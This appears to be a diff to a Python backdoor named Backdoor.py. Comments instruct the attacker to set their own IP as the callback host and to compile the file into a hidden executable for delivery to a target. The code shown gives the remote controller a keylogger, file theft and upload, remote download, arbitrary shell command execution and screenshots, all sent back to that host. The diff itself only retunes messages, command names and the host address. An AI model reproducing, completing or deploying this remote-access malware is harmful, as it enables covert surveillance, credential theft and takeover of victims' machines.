@@ -9,13 +9,16 @@ import base64
 import threading
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
-host_ip = "127.0.0.1" 
+host_ip = "192.168.2.3" 
 #first before deliver make it exe or linux executable file :
 #Linux User Setup wine environment with python3 directory
 # target is windows then command : wine /root/.wine/drive_c/pyinstaller.exe --onefile --noconsole Backdoor.py 
 # target is linux then command : pyinstaller --onefile --noconsole Backdoor.py 
 keys = ""
-path = os.environ["appdata"]+"\\keylogger.txt"
+try:
+	path = os.environ["appdata"]+"\\keylogger.txt"
+except :
+	path = 	"\\temp\\keylogger.txt"
 
 def process_keys(key) :
 	global keys
@@ -73,7 +76,7 @@ def is_admin():
 	try:
 		os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
 	except:	
-		admin="[!!] User Privileges!"
+		admin="[!] User Privileges!"
 	else:
 		admin="[+] Administrator Privileges!"
 
@@ -105,8 +108,8 @@ def shell():
 			screenshot      -> Take A Screenshot of Targets Monior.
 			check           -> Check For Administrator Privileges .
 			q               -> exit frok backdoor.
-			keylogger_start -> stat keylogger.
-			keylogger_dump  -> stop keylogger.
+			keylog_start -> stat keylogger.
+			keylog_dump  -> stop keylogger.
 			'''
 		  reliable_send(help_options)
 
@@ -121,28 +124,28 @@ def shell():
 				file = open (command [9:], "rb")
 				reliable_send(base64.b64encode(file.read()))
 			except FileNotFoundError:
-				reliable_send("[!!] File Not Found")
+				reliable_send("[!] File Not Found")
 				continue
 				 
 		elif command [:6] == "upload":
 				result = reliable_recv()
-				if result[:4] != "[!!]":
+				if result[:4] != "[!]":
 					fin = open(command [7:], "wb")
-					fin.write(base64.b64decode(result))				
+					fin.write(base64.b64decode(result))						
 
 		elif command [:3] == "get":
 			try:
 				download(command [4:]) 
 				reliable_send("[+] Downloaded File From Specified URL!")
 			except:
-			  reliable_send("[!!] Failed To Download File")
+			  reliable_send("[!] Failed To Download File")
 
 		elif command [:5] == "start":
 			try:
 				subprocess.Popen(command [6:], shell=True)
 				reliable_send("[+] Started!")
 			except:
-				reliable_send("[!!] Failed To Start!")
+				reliable_send("[!] Failed To Start!")
 
 		elif command[:10] == "screenshot":
 			try:
@@ -151,7 +154,7 @@ def shell():
 				reliable_send(base64.b64encode(sc.read()))
 				os.remove("monitor-1.png")
 			except:
-				reliable_send("[!!] Failed To Take Screenshot")
+				reliable_send("[!] Failed To Take Screenshot")
 
 		elif command[:5] == "check":
 			try:
